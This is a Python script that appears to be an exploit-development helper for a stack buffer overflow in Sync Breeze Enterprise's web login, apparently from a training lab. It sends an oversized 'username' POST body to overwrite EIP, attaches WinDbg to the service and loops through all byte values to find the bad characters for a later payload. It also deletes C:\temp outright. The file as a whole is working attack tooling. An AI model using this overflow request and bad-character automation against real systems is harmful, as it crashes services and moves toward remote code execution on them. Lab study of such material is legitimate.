#!/usr/bin/python
import socket
import time
import subprocess
import os
import shutil
from pathlib import Path
from struct import *


server = "127.0.0.1"
port = 80
adjuster = 0

size = 780 + 4
service_name = "Sync Breeze Enterprise"

def send_payload(test_bytes):
    inputBuffer = test_bytes + (b"A" * (size - len(test_bytes)))

    try:
        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
        buffer += b"Referer: http://10.11.0.22/login\r\n"
        buffer += b"Connection: close\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content
        print("Sending evil buffer...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buffer)
        s.close()
    except Exception as e:
        print("    [!] Socket error:", e)


def start_process(logfile):
    windbg = r"C:\Program Files\Windows Kits\10\Debuggers\x86\windbg.exe"
    global service_name

    pid = start_service_and_get_pid()
    print(f"[+] Attached to service PID {pid}")

# For SEH
    # cmds = (
    #     f".logopen {logfile};"
    #     "sxe av;"          # break on access violation
    #     "g;"
    #     "g;"
    #     "r;"
    #     "!exchain;"
    #     ".logclose;"
    #     "q"
    # )

# For BOF
    cmds = (
        f".logopen {logfile};"
        "sxe av;"          # break on access violation
        "g;"
        "r;"
        ".logclose;"
        "q"
    )

    subprocess.Popen([
        windbg,
        "-p", str(pid),
        "-c", cmds
    ])

    # Give WinDbg time to attach
    time.sleep(adjuster + 2)


#=============================================================================================================================
 
badchars = []

try:
    shutil.rmtree(Path("C:/temp"))
    time.sleep(adjuster + 2)
except:
    pass

os.mkdir("C:\\temp")

def chunk_log_name(chunk):
    return r"C:\temp\windbg_chunk_" + "-".join(f"{b:02x}" for b in chunk) + ".txt"

def byte_log_name(b):
    return rf"C:\temp\windbg_byte_{b:02x}.txt"
    
def start_service_and_get_pid():
    global service_name
    # Start the service
    subprocess.call(
        f'cmd /c sc start "{service_name}"',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Poll until PID is available
    for _ in range(20):
        try:
            output = subprocess.check_output(
                f'cmd /c sc queryex "{service_name}"',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")

            for line in output.splitlines():
                if "PID" in line:
                    pid = int(line.split(":")[1].strip())
                    return pid
        except:
            pass

        time.sleep(adjuster + 0.5)

    raise RuntimeError("Failed to obtain service PID")

def kill_process():
    global service_name
    subprocess.call(
        f'cmd /c sc stop "{service_name}"',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
def eip_overwritten(logfile):
    try:
        with open(logfile, "r", errors="ignore") as f:
            for line in f:
                if "eip=41414141" in line.lower():
                    return True
    except FileNotFoundError:
        print("File not found")
    return False

def is_process_running(logfile):
    running = True
    if eip_overwritten(logfile):
        print("    [!] EIP overwrite detected (41414141)")
        running = False

    return running




def test_single_byte(b):
    logfile = byte_log_name(b)

    print("        [*] Testing single byte 0x{:02x}".format(b))
    start_process(logfile)
    send_payload(bytes([b]))
    time.sleep(adjuster + 4)

    if is_process_running(logfile):
        print("        [+] BAD CHAR FOUND: 0x{:02x}".format(b))
        badchars.append(b)
    else:
        print("        [-] OK char: 0x{:02x}".format(b))
    kill_process()

# === Main logic ===

for chunk_start in range(0, 256, 16):
    chunk = bytes(range(chunk_start, min(chunk_start + 16, 256)))
    print("\n[*] Testing chunk: {}".format(
        " ".join("0x{:02x}".format(b) for b in chunk)
    ))
    logfile = chunk_log_name(chunk)

    start_process(logfile)
    send_payload(chunk)
    time.sleep(adjuster + 4)

    if is_process_running(logfile):
        print("    [+] Application alive → BAD CHAR in chunk")
        kill_process()


        for b in chunk:
            test_single_byte(b)
    else:
        print("    [-] Application crashed → chunk OK")
    kill_process()

print("\n=== Final Bad Characters ===")
print(" ".join("\\x{:02x}".format(b) for b in badchars))

input("")
